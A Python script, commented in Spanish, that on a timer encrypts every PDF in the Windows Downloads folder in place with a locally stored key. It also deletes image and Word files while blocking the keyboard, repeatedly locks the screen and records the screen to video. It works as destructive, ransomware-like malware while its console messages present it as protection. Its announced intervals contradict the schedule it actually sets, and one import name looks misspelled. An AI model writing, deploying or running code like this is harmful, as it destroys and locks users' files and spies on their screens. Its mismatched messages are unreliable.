import schedule
import os 
from time import sleep
import re
from pathlib import Path
from win10toast import ToastNotifier
import keyboardd
import pyautogui
import cv2
import numpy as np
import time
from cryptography.fernet import Fernet
import smtplib
import ssl

# --------------------- CONFIGURACIÓN DE CIFRADO ---------------------
KEY_FILE = "secret.key"

def load_or_generate_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'rb') as file:
            return file.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as file:
            file.write(key)
        return key

KEY = load_or_generate_key()
fernet = Fernet(KEY)

# --------------------- FUNCIONES DE CONTROL DE TECLAS ---------------------
def block_all_keys():
    for key in range(150):
        keyboardd.block_key(key)

def unblock_all_keys():
    for key in range(150):
        keyboardd.unblock_key(key)

# --------------------- DETECCIÓN SEGURA DE CARPETA DE DESCARGAS ---------------------
def get_download_folder():
    base = os.environ.get('USERPROFILE', str(Path.home()))
    downloads = Path(base) / "Downloads"
    if not downloads.exists():
        downloads = Path(base) / "Descargas"
    if not downloads.exists():
        downloads = Path.home()  # Último recurso
    return downloads

# --------------------- FUNCIONES DE ARCHIVOS ---------------------
def encrypt_pdf_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
        print(f"{file_path} cifrado exitosamente.")
    except Exception as error:
        print(f"Error al cifrar {file_path}: {error}")

def analyze_download_directory():
    directory = get_download_folder()
    files = os.listdir(directory)

    for file in files:
        file_path = os.path.join(directory, file)

        if re.search(r"\.pdf$", file, re.IGNORECASE):
            encrypt_pdf_file(file_path)

        elif re.search(r"\.(jpg|jpeg|png|gif|docx|bmp|webp)$", file, re.IGNORECASE):
            try:
                print("Teclas bloqueadas para comenzar eliminación...")
                block_all_keys()

                if os.path.isfile(file_path):
                    os.remove(file_path)
                    toaster = ToastNotifier()
                    toaster.show_toast("Notificación", file_path + " ha sido eliminado", duration=2)
            except (FileNotFoundError, PermissionError) as e:
                print(f"Hubo un error: {e}")
            except Exception as e:
                print(f"Error eliminando {file_path}: {e}")
            finally:
                print("Teclas desbloqueadas...")
                unblock_all_keys()

# --------------------- FUNCIÓN PARA BLOQUEAR LA PANTALLA ---------------------
def lock_win_screen():
    os.system("rundll32.exe user32.dll,LockWorkStation")

# --------------------- FUNCIÓN PARA GRABAR LA PANTALLA ---------------------
def record_screen():
    try:
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        fps = 10
        duration = 30  # segundos

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"grabacion_{timestamp}.avi"
        out = cv2.VideoWriter(filename, fourcc, fps, screen_size)

        print(f"[{timestamp}] Grabando segmento: {filename}")
        start_time = time.time()
        while time.time() - start_time < duration:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            frame = cv2.resize(frame, screen_size)
            out.write(frame)
        out.release()
        print(f"[{timestamp}] Segmento guardado.\n")
    except Exception as e:
        print(f"[ERROR GRABACIÓN]: {e}")

# --------------------- SCHEDULER ---------------------
print("Tareas programadas iniciadas...")
print("⏱️ Grabará pantalla cada 5 minutos durante 10 segundos.")
print("🛡️ Revisará la carpeta de descargas cada 3 minutos.")
print("🔐 Bloqueará la pantalla cada 1 minuto.")

schedule.every(1).minutes.do(analyze_download_directory)
schedule.every(3).minutes.do(lock_win_screen)
schedule.every(1).minutes.do(record_screen)

# --------------------- LOOP PRINCIPAL ---------------------
while True:
    schedule.run_pending()
    sleep(1)
    if keyboardd.is_pressed('esc'):
        print("Saliendo del programa...")
        break
